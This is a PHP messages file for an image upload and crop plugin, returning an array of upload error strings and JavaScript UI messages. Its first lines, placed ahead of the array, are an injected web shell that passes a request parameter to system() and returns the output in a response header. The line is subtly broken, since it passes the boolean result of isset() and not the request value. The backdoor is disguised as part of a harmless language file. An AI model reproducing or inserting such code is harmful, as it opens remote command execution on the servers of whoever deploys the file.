<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

return array(
	1 => 'The uploaded file exceeds the upload_max_filesize directive in php.ini.',
    2 => 'The uploaded file exceeds the MAX_FILE_SIZE directive that was specified in the HTML form.',
    3 => 'The uploaded file was only partially uploaded.',
    4 => 'No file was uploaded.',
    6 => 'Missing a temporary folder.',
    7 => 'Failed to write file to disk.',
    8 => 'A PHP extension stopped the file upload.',
    'gd' => 'PHP GD library is NOT installed on your web server.',
    'post_max_size' => 'The uploaded file exceeds the post_max_size directive in php.ini.',
    'max_file_size' => 'File is too big.',
    'min_file_size' => 'File is too small.',
    'accept_file_types' => 'Filetype not allowed.',
    'max_width'  => 'Image exceeds maximum width of ',
    'min_width'  => 'Image requires a minimum width of ',
    'max_height' => 'Image exceeds maximum height of ',
    'min_height' => 'Image requires a minimum height of ',
    'upload_failed' => 'Failed to upload the file.',
    'move_failed' => 'Failed to upload the file.',
    'invalid_image' => 'Invalid image.',
    'image_resize' => 'Failed to resize image.',
    'not_exists' => 'Failed to load the image.',

	'js' => array(
		'selectimg' => 'Please select a image to upload.',
		'parsererror' => 'Oops! Something went wrong.',
		'webcamerror' => 'Webcam Error: ',
		'uploading' => 'Uploading...',
		'error' => 'Oops! Something went wrong.',
		'datauri' => 'Cannot locate image format in Data URI.',
		'webcamjs' => 'Flash Webcam not found.',
		'upgrade' => 'This feature is not available in this browser.',
		'loading' => 'Loading image...',
		'saving' => 'Saving...',
		'jcrop' => 'jQuery Jcrop not found.',
		'minCropWidth' => 'Crop selection requires a minimum width of ',
		'maxCropWidth' => 'Crop selection exceeds maximum width of ',
		'minCropHeight' => 'Crop selection requires a height of ',
		'maxCropHeight' => 'Crop selection exceeds maximum height of ',
		'img404' => 'Error 404: No image was found.',
	)
);